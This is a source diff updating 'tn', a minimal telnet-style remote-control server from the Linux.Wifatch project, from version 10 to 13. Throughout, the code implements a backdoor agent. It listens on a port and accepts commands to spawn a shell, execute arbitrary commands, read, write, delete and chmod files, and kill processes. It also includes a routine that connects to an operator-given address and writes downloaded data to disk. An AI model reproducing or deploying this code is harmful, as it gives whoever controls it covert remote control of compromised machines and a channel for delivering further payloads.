@@ -18,65 +18,65 @@
  * along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
  */
 
-// usage: tn port id64.key64 -- primitive telnet server
+// usage: tn port id64.secret64.port4 -- primitive telnet server
 
-// 1 -- start shell
-// 2 path -- open rdonly
-// 3 path -- open wrcreat
-// 4 -- close
-// 5 signal8 x16 pid32 -- kill
-// 6 x8 mod16 path -- chmod
-// 7 srcpath | dstpath -- rename
-// 8 path -- unlink
-// 9 path -- mkdir
-// 10 x8 port16be saddr32be | writedata* | "" | dstpatha - len32* -- download // need to use readlink or so
-// 11 path - statdata -- lstat
-// 12 path - statdata -- statfs
-// 13 command -- exec command (stdin/out/err null)
-// 14 command - cmdoutput... "chg_id" -- exec commmand  with end marker
-// 15 - dirdata* | "" -- getdents64
-// 16 x16 mode8 off32 --  lseek
-// 17 - fnv32a -- fnv32a
-// 18 - filedata* | "" -- readall file
-// 19 filedate -- write file
-// 20 path - linkdata -- readlink
-// 21 - ret32 -- last syscall result
-
-// ver7
-// 22 path - chdir
-
-// ver 8
-// 23 path - statdata -- stat
-
-// ver 9
-// 15 - paths* | "" -- getdents64
-// 17 x24 len32 - fnv32a -- fnv32a
-// 18 x24 len32 - filedata* | "" -- read file
+//      1 -- start shell
+//      2 path -- open rdonly
+//      3 path -- open wrcreat
+//      4 -- close
+//      5 signal8 x16 pid32 -- kill
+//      6 x8 mod16 path -- chmod
+//      7 srcpath | dstpath -- rename
+//      8 path -- unlink
+//      9 path -- mkdir
+//     10 x8 port16be saddr32be | writedata* | "" | dstpatha - len32* -- download // need to use readlink or so
+// V12 10 x8 port16be saddr32be | writedata* | "" | dstpatha - ""* ret32 errno32 -- download
+//     11 [path] - statdata -- lstat
+//     12 path - statdata -- statfs
+//     13 command -- exec command (stdin/out/err null)
+//     14 command - cmdoutput... "chg_id" -- exec commmand  with end marker
+//     15 - dirdata* | "" -- getdents64
+// V 9 15 - paths* | "" -- getdents64
+//     16 x16 mode8 off32 --  lseek
+//     17 - fnv32a -- fnv32a
+// V 9 17 [x24 len32] - fnv32a -- fnv32a
+//     18 - filedata* | "" -- readall file
+// V 9 18 [x24 len32] - filedata* | "" -- read file
+//     19 filedata -- write file
+//     20 path - linkdata -- readlink
+//     21 - ret32 -- last syscall result
+// V 7 22 path - chdir
+// V 8 23 path - statdata -- stat
+// V10 24 sha3 [x16 len32] - keccak -- keccak-1600-1088-512 or sha3-256
+// V11 25 x3 ms32 -- sleep
+// V13 26 x1 mode16 mode32 path -- open
 
 // ver 10
 // use wait4 instead of waitpid, maybe that helps
 // properly set so_reuseaddr on the listening socket
-// 24 sha3 x16 len32 - keccak -- keccak-1600-1088-512 or sha3-256
 
-#define VERSION "10"
+// ver 12
+// use BER encoding for stat, statvfs
+// empty name in stat means fstat
+// fnv/readall/keccak make length optional
+// xstat error results in empty packet
+
+// ver 13
+// replace 2, 3 by 26
+
+#define VERSION "13"
 
 #include <errno.h>
-#include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <inttypes.h>
 #include <sys/statfs.h>
 #include <sys/stat.h>
-#include <sys/time.h>
-#include <sys/resource.h>
-#include <inttypes.h>
 #include <signal.h>
-#include <string.h>
-#include <time.h>
 #include <fcntl.h>
-
+#include <inttypes.h>
 #include <sys/syscall.h>
 
 #include "tinyutil.h"
@@ -122,19 +122,33 @@ static void wpkt(uint8_t * base, uint8_t len)
         write(1, base, len);
 }
 
+NOINLINE static uint8_t *pack_rw(uint8_t * p, uint32_t v)
+{
+        *--p = v & 0x7f;
+
+        for (;;) {
+                v >>= 7;
+                if (!v)
+                        return p;
+
+                *--p = v | 0x80;
+        }
+}
+
 static void sockopts(int fd)
 {
         static const int one = 1;
 
         setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof (one));
         setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof (one));
+        //setsockopt (fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof (one)); // only good for testing
 }
 
-static uint32_t wget(int fh)
+static uint32_t wget(int fd)
 {
-        int fd = socket(AF_INET, SOCK_STREAM, 0);
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
 
-        if (fd < 0)
+        if (sock < 0)
                 return 1;
 
         struct sockaddr_in sa;
@@ -143,27 +157,28 @@ static uint32_t wget(int fh)
         sa.sin_addr.s_addr = *(uint32_t *) (buffer + 4);
         sa.sin_port = *(uint16_t *) (buffer + 2);;
 
-        sockopts(fd);
+        sockopts(sock);
 
-        if (connect(fd, (struct sockaddr *)&sa, sizeof (sa)))
+        if (connect(sock, (struct sockaddr *)&sa, sizeof (sa)))
                 return 2;
 
         int wlen;
 
         while ((wlen = rpkt(0)))
-                write(fd, buffer, wlen);
+                write(sock, buffer, wlen);
 
         for (;;) {
-                int len = recv(fd, buffer, BUFFER_SIZE, MSG_WAITALL);
+                uint32_t len = recv(sock, buffer, BUFFER_SIZE, MSG_WAITALL);
 
                 if (len <= 0)
                         break;
 
-                write(fh, buffer, len);
-                wpkt((uint8_t *) & len, sizeof (len));
+                write(fd, buffer, len);
+
+                wpkt(buffer, 0);
         }
 
-        close(fd);
+        close(sock);
 
         return 0;
 }
@@ -232,6 +247,7 @@ int main(int argc, char *argv[])
         sigaction(SIGCHLD, &sa_sigign, 0);
 
         syscall(SCN(SYS_setsid));
+        syscall(SCN(SYS_umask), 0000);
 
         for (;;) {
                 {
@@ -277,7 +293,7 @@ int main(int argc, char *argv[])
                                 wpkt(buffer, 0);
 
                                 uint8_t clen;
-                                int fh = -1;
+                                int fd;
                                 int ret;
 
                                 while ((clen = rpkt(0)))
@@ -289,13 +305,8 @@ int main(int argc, char *argv[])
                                                   }
                                                   break;
 
-                                          case 2:      // open readonly
-                                          case 3:      // open wrcreat
-                                                  ret = fh = open(buffer + 1, buffer[0] == 2 ? O_RDONLY : O_RDWR | O_CREAT, 0600);
-                                                  break;
-
                                           case 4:      // close
-                                                  close(fh);
+                                                  close(fd);
                                                   break;
 
                                           case 5:      // kill
@@ -319,23 +330,39 @@ int main(int argc, char *argv[])
                                                   ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
                                                   break;
 
-                                          case 10:     // wget
-                                                  ret = wget(fh);
-                                                  break;
-
                                           case 11:     // lstat
                                           case 23:     // stat
                                                   {
                                                           struct stat buf;
-                                                          int l = (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf);
+                                                          int l;
 
-                                                          ((uint32_t *) buffer)[0] = buf.st_dev;
-                                                          ((uint32_t *) buffer)[1] = buf.st_ino;
-                                                          ((uint32_t *) buffer)[2] = buf.st_mode;
-                                                          ((uint32_t *) buffer)[3] = buf.st_size;
-                                                          ((uint32_t *) buffer)[4] = buf.st_mtime;
+#if HAVE_XSTAT
+                                                          int nr = SCN(SYS_fstat);
+                                                          long arg = fd;
 
-                                                          wpkt(buffer, l ? 0 : sizeof (uint32_t) * 5);
+                                                          if (clen > 1) {
+                                                                  arg = (long)(buffer + 1);
+                                                                  nr = buffer[0] == 23 ? SCN(SYS_stat) : SCN(SYS_lstat);
+                                                          }
+
+                                                          l = xstat(nr, arg, &buf);
+
+#else
+                                                          l = buffer[1]
+                                                              ? (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf)
+                                                              : fstat(fd, &buf);
+#endif
+
+                                                          uint8_t *p = buffer + 6 * 5;
+
+                                                          p = pack_rw(p, buf.st_uid);
+                                                          p = pack_rw(p, buf.st_mtime);
+                                                          p = pack_rw(p, buf.st_size);
+                                                          p = pack_rw(p, buf.st_mode);
+                                                          p = pack_rw(p, buf.st_ino);
+                                                          p = pack_rw(p, buf.st_dev);
+
+                                                          wpkt(p, (buffer + 6 * 5 - p) & -!l);
                                                   }
                                                   break;
 
@@ -343,16 +370,17 @@ int main(int argc, char *argv[])
                                                   {
                                                           struct statfs sfsbuf;
                                                           int l = statfs(buffer + 1, &sfsbuf);
+                                                          uint8_t *p = buffer + 7 * 5;
 
-                                                          ((uint32_t *) buffer)[0] = sfsbuf.f_type;
-                                                          ((uint32_t *) buffer)[1] = sfsbuf.f_bsize;
-                                                          ((uint32_t *) buffer)[2] = sfsbuf.f_blocks;
-                                                          ((uint32_t *) buffer)[3] = sfsbuf.f_bfree;
-                                                          ((uint32_t *) buffer)[4] = sfsbuf.f_bavail;
-                                                          ((uint32_t *) buffer)[5] = sfsbuf.f_files;
-                                                          ((uint32_t *) buffer)[6] = sfsbuf.f_ffree;
+                                                          p = pack_rw(p, sfsbuf.f_ffree);
+                                                          p = pack_rw(p, sfsbuf.f_files);
+                                                          p = pack_rw(p, sfsbuf.f_bavail);
+                                                          p = pack_rw(p, sfsbuf.f_bfree);
+                                                          p = pack_rw(p, sfsbuf.f_blocks);
+                                                          p = pack_rw(p, sfsbuf.f_bsize);
+                                                          p = pack_rw(p, sfsbuf.f_type);
 
-                                                          wpkt(buffer, l ? 0 : sizeof (uint32_t) * 7);
+                                                          wpkt(p, (buffer + 7 * 5 - p) & -!l);
                                                   }
                                                   break;
 
@@ -384,7 +412,7 @@ int main(int argc, char *argv[])
                                                   {
                                                           int l;
 
-                                                          while ((l = syscall(SCN(SYS_getdents64), fh, buffer, sizeof (buffer))) > 0) {
+                                                          while ((l = syscall(SCN(SYS_getdents64), fd, buffer, sizeof (buffer))) > 0) {
                                                                   uint8_t *cur = buffer;
                                                                   uint8_t *end = buffer + l;
 
@@ -401,23 +429,23 @@ int main(int argc, char *argv[])
                                                   break;
 
                                           case 16:     // lseek
-                                                  ret = lseek(fh, *(int32_t *) (buffer + 4), buffer[3]);
+                                                  ret = lseek(fd, *(int32_t *) (buffer + 4), buffer[3]);
                                                   break;
 
                                           case 17:     // fnv
-                                          case 18:     // readall
+                                          case 18:     // read/readall
                                           case 24:     // keccak
                                                   {
                                                           int fnv = buffer[0] == 17;
                                                           int kec = buffer[0] == 24;
                                                           int sha = buffer[1];
                                                           uint32_t hval = 2166136261U;
-                                                          uint32_t max = *(uint32_t *) (buffer + 4);
+                                                          uint32_t max = clen >= 8 ? *(uint32_t *) (buffer + 4) : -1;
                                                           int l, m = buffer[0] == 18 ? 254 : BUFFER_SIZE;
 
                                                           Keccak_Init();
 
-                                                          while ((l = read(fh, buffer, MIN(max, m))) > 0) {
+                                                          while ((l = read(fd, buffer, MIN(max, m))) > 0) {
                                                                   max -= l;
 
                                                                   if (fnv) {
@@ -445,7 +473,7 @@ int main(int argc, char *argv[])
                                                   break;
 
                                           case 19:     // write
-                                                  ret = write(fh, buffer + 1, clen - 1);
+                                                  ret = write(fd, buffer + 1, clen - 1);
                                                   break;
 
                                           case 20:     // readlink
@@ -456,7 +484,12 @@ int main(int argc, char *argv[])
                                                   }
                                                   break;
 
+                                          case 10:     // wget
+                                                  ret = wget(fd);
+                                                  // fall through
+
                                           case 21:     // readret
+                                                  wpkt((uint8_t *) & errno, sizeof (errno));
                                                   wpkt((uint8_t *) & ret, sizeof (ret));
                                                   break;
 
@@ -464,13 +497,20 @@ int main(int argc, char *argv[])
                                                   ret = syscall(SCN(SYS_chdir), buffer + 1);
                                                   break;
 
+                                          case 25:     // sleep
+                                                  sleep_ms(*(uint32_t *) (buffer + 4));
+                                                  break;
+
+                                          case 26:     // open
+                                                  ret = fd = open(buffer + 8, *(int32_t *) (buffer + 4), *(int16_t *) (buffer + 2));
+                                                  break;
+
                                           default:
                                                   x();
                                         }
                         }
                         // keep fd open for at least delay, also delay hack attempts
-                        static const struct timespec ts = { 1, 0 };
-                        syscall(SCN(SYS_nanosleep), &ts, 0);
+                        sleep_ms(1000);
 
                         close(fd);
                 }
